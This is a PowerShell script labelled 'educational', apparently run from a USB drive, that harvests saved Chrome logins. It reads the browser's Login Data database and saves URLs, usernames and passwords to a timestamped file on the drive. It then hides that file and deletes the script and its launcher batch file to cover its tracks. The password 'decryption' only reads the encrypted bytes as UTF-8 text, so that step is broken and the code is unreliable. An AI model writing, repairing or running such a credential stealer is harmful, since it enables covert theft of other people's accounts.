# Browser Credential Collector (Educational Purpose Only)
$usbPath = $PSScriptRoot
$outputFile = "$usbPath\credentials_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"

# Function to decode Chrome passwords (requires user to be logged in)
function Get-ChromeCredentials {
    $localAppData = $env:LOCALAPPDATA
    $chromeLoginData = "$localAppData\Google\Chrome\User Data\Default\Login Data"
    
    if (Test-Path $chromeLoginData) {
        try {
            $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
            $connection.ConnectionString = "Data Source=$chromeLoginData"
            $connection.Open()
            
            $query = $connection.CreateCommand()
            $query.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
            $adapter = New-Object -TypeName System.Data.SQLite.SQLiteDataAdapter $query
            $data = New-Object -TypeName System.Data.DataSet
            $adapter.Fill($data)
            
            $results = @()
            foreach ($row in $data.Tables[0].Rows) {
                $encryptedBytes = $row.password_value
                $decrypted = [System.Text.Encoding]::UTF8.GetString($encryptedBytes)
                $results += [PSCustomObject]@{
                    URL = $row.origin_url
                    Username = $row.username_value
                    Password = $decrypted
                }
            }
            return $results
        }
        finally {
            if ($connection) { $connection.Close() }
        }
    }
}

# Collect data
$results = @()
$results += "===== Chrome Credentials ====="
$results += (Get-ChromeCredentials | Format-List | Out-String)

# Save to USB
$results | Out-File -FilePath $outputFile -Encoding utf8

# Hide the file
attrib +h +s "$outputFile"

# Self-destruct script
Remove-Item "$usbPath\collect.ps1" -Force
Remove-Item "$usbPath\launch.bat" -Force